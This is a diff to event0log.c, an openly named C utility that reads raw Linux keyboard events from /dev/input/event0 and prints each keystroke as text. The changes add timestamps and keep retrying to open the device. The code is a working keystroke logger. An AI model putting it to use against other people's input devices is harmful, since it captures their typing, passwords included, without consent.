@@ -1,4 +1,4 @@
-/* event0log.c v0.8
+/* event0log.c v0.9
  * <~~Harvie 2oo8-2o21
  * THX2:	Dayvee (Idea), joe@aol.com (Reversing),
  *				-=Punka][Tux=- (BugReport),
@@ -32,6 +32,7 @@
 #include <stdint.h>
 #include <unistd.h>
 #include <signal.h>
+#include <time.h>
 #define DEFAULTINPUT "/dev/input/event0"
 
 typedef struct __attribute__((__packed__)) input_event_s {
@@ -40,6 +41,8 @@ typedef struct __attribute__((__packed__)) input_event_s {
 	unsigned short code;
 	unsigned int value;
 } input_event_t;
+
+time_t timestamp = 0;
 
 #define MAXSTROKE 169 //Set higest keystroke code in DB (lower will not be converted)
 char *strokes[] = { //KeyStroke DB for english QUERTZ keyboard:
@@ -86,38 +89,44 @@ int main(int argc, char *argv[]) {
 	signal(SIGSEGV, &sigint_handler);
 
 
-	FILE *ftest;
-	printf("Reading data from: ");
+	printf("Scancode DB size: %d B (0-%d)", sizeof(strokes), MAXSTROKE);
+
+	char * filepath = NULL;
 	if(argc > 1 && argv[1][0] != '-') {
-		ftest = freopen(argv[1], "rb", stdin);
-		printf("%s\n", argv[1]);
+		filepath = &argv[1][0];
 	}
 	if(argc > 1 && argv[1][0] == '-') {
-		ftest = freopen(DEFAULTINPUT, "rb", stdin);
-		printf("%s\n", DEFAULTINPUT);
-	}
-	if(argc == 1) {
-		printf("STDIN\n", argv[1]);
+		filepath = DEFAULTINPUT;
 	}
 
-	if(ftest == NULL) {
-		printf("Failed to open file!\n\n");
-		return(1);
+
+	while(1) {
+
+	while(1) {
+		if(filepath != NULL && freopen(filepath, "rb", stdin) == NULL) {
+			printf("\n%lu\tFailed to open file %s", time(NULL), filepath);
+			sleep(1);
+			continue;
+			//return(1);
+		} else {
+			if(filepath != NULL) printf("\n%lu\tOpened file %s\n", time(NULL), filepath);
+			break;
+		}
 	}
 	setbuf(stdout, NULL);
 
-	printf("Keystroke DB size: %d B (0-%d)\n\n", sizeof(strokes), MAXSTROKE);
 
 	input_event_t input_event;
-	while(1) {
-		read(0, &input_event, sizeof(input_event_t));
+	while(read(0, &input_event, sizeof(input_event_t)) != -1) {
 		if(input_event.type != 1 || input_event.value != 1) continue;
-		//printf("\nTYPE:%d\tCODE:%d\tVAL:%d\t", input_event.type, input_event.code, input_event.value);
+		//printf("\n%lu\tTYPE:%d\tCODE:%d\tVAL:%d\t", input_event.time.tv_sec, input_event.type, input_event.code, input_event.value);
 		if(input_event.code <= MAXSTROKE) {
 			printf("%s", strokes[input_event.code]);
 		} else {
 			printf("<%d>", input_event.code);
 		}
+	}
+
 	}
 
 }
